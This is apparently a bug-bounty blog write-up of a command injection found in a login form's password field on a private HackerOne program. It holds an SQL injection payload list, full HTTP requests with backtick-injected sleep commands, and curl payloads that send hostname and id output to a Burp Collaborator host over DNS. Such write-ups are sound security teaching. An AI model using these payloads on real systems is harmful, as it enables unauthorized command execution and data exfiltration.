---
title: "Story of OS Command Injection worth $7500"
date: 2021-10-15 12:00:00 -500
categories: [Command Injection, RCE, "out-of-band", OOB]
tags: [Command Injection, RCE, "out-of-band", OOB]
---


Command injection is a type of vulnerability that allows an attacker to execute arbitrary system commands on a vulnerable server. This type of attack occurs when an application fails to properly validate user input and passes it to a command shell, which can be exploited by an attacker to run malicious commands.


Recently, I came across a private program on HackerOne that was vulnerable to command injection. The program had some restrictions in place, But I was able to bypass these restrictions using Out-of-Band techniques and fully perform Remote Command Execution (RCE).

For privacy reasons and in accordance with the responsible disclosure policy, I will be hiding any information related to the web application.



# Detection:

During my initial testing of the web application, I focused on identifying any SQL injection vulnerabilities in the Login requests. As a first step, I typically use simple payloads to test for basic SQL injection, such as single quotes, semicolons, like the following ones: 


```
'
''
`
``
,
"
' or "
-- or # 
' OR '1
' OR 1 -- -
" OR "" = "
" OR 1 = 1 -- -
' OR '' = '
,(select * from (select(sleep(10)))a)
%2c(select%20*%20from%20(select(sleep(10)))a)
';WAITFOR DELAY '0:0:30'--
```

For more payloads see: [https://github.com/payloadbox/sql-injection-payload-list](https://github.com/payloadbox/sql-injection-payload-list)


If these payloads don't return any errors or unexpected behavior, I then turn to more advanced tools like SQLMap to further test the application for SQL injection vulnerabilities. 

Fortunately, during my testing of the web application, I discovered that the web application only responded to payloads containing the `sleep` command. This anomaly raised my suspicion that the vulnerability was not related to SQL injection, but instead was a command injection vulnerability.

To confirm my suspicion, I began manipulating the web server's response by experimenting with different values for the `sleep` payload. By analyzing the server's response to these payloads, I was able to confirm that the vulnerability was indeed a command injection vulnerability, rather than a SQL injection vulnerability as I had initially suspected.


## Step 1

Starting with the following value: `sleep 10`

>HTTP Request

```http
POST /connexion/ HTTP/2
Host: www.target.com
Cookie: target=test
Content-Length: 61
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9

username=sandh0t%40mail.com&password=%60sleep%2010%60

```

>HTTP Response

![](/assets/img/4/1.jpg)


## Step 2

Then doubling the value with `sleep 20`

>HTTP Request

```http
POST /connexion/ HTTP/2
Host: www.target.com
Cookie: target=test
Content-Length: 61
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9

username=sandh0t%40mail.com&password=%60sleep%2020%60

```

>HTTP Response

![](/assets/img/4/2.jpg)


## Step 3

Tripling  the value with `sleep 30`

>HTTP Request

```http
POST /connexion/ HTTP/2
Host: www.target.com
Cookie: target=test
Content-Length: 61
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9

username=sandh0t%40mail.com&password=%60sleep%2030%60

```

>HTTP Response

![](/assets/img/4/3.jpg)


# Out-of-Band (OOB) Payload:


OOB payloads are used also to exfiltrate data from a target system to a remote server, which can be used to confirm the vulnerability and gain access to sensitive information.

Up to this point, I had been able to successfully exploit the vulnerability, but I found that the web application was not returning any data. To further test the vulnerability, I decided to use Out-of-Band (OOB) payloads and send HTTP requests to my Burp Collaborator using the curl command, using this payload 

`sleep 02 && curl http://mpfwtwsh7ylajkb4kfc5bc0i197zvo.burpcollaborator.net`



>HTTP Request

```http
POST /connexion/ HTTP/2
Host: www.target.com
Cookie: target=test
Content-Length: 61
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9

username=sandsuperhot%40gmail.com&password=%60sleep%2002%20%26%26%20curl%20http://mpfwtwsh7ylajkb4kfc5bc0i197zvo.burpcollaborator.net%60

```


Success! I was able to receive valid DNS requests, but interestingly, I did not receive any corresponding HTTP requests.


>HTTP Response

![](/assets/img/4/7.jpg)



# Exploitation Time :


In order to fully demonstrate the extent of the vulnerability, I had to bypass the server's restriction that only allowed for DNS requests and not HTTP requests. To achieve this, I employed a technique that enabled me to execute system commands and extract their output by making DNS query requests. By doing this, I was able to demonstrate that the vulnerability had the potential to be exploited for remote code execution.

## Getting the System Hostname value:


```
`sleep 02 && curl http://$(hostname).mpfwtwsh7ylajkb4kfc5bc0i197zvo.burpcollaborator.net`
```

>HTTP Request

```http
POST /connexion/ HTTP/2
Host: www.target.com
Cookie: target=test
Content-Length: 61
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9

username=sandsuperhot%40gmail.com&password=%60sleep%2002%20%26%26%20curl%20http://%24(hostname).mpfwtwsh7ylajkb4kfc5bc0i197zvo.burpcollaborator.net%60

```

>HTTP Response

![](/assets/img/4/5.jpg)


## Getting the Web Application Id value:


```
`sleep 02 && curl http://$(id).mpfwtwsh7ylajkb4kfc5bc0i197zvo.burpcollaborator.net`
```

>HTTP Request

```http
POST /connexion/ HTTP/2
Host: www.target.com
Cookie: target=test
Content-Length: 61
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9

username=sandsuperhot%40gmail.com&password=%60sleep%2002%20%26%26%20curl%20http://%24(id).mpfwtwsh7ylajkb4kfc5bc0i197zvo.burpcollaborator.net%60

```

>HTTP Response

![](/assets/img/4/6.jpg)



# Reward:

I was able to successfully get the server hostname, and the web application process id, and was considering taking further steps to exploit the vulnerability, but I contacted the Triage team first to see if I was allowed to do so. However, The Triage team responded that the evidence I had provided was enough, and they awarded me the maximum reward for my finding.

![](/assets/img/4/reward.png)

This vulnerability could have been exploited by an attacker to perform remote code execution (RCE) on the target system, which could have resulted in the compromise of sensitive data and the complete takeover of the system.


# Takeaway

To prevent command injection vulnerabilities, it is important to validate all user input and sanitize it to remove any potentially dangerous characters. Additionally, it is important to limit access to system commands to only authorized users and implement proper access control measures.

In conclusion, this experience demonstrates the importance of thorough testing and vulnerability assessment to ensure the security of web applications. By being diligent and persistent in your testing, you can help identify and mitigate security vulnerabilities that could lead to severe consequences for organizations and their customers.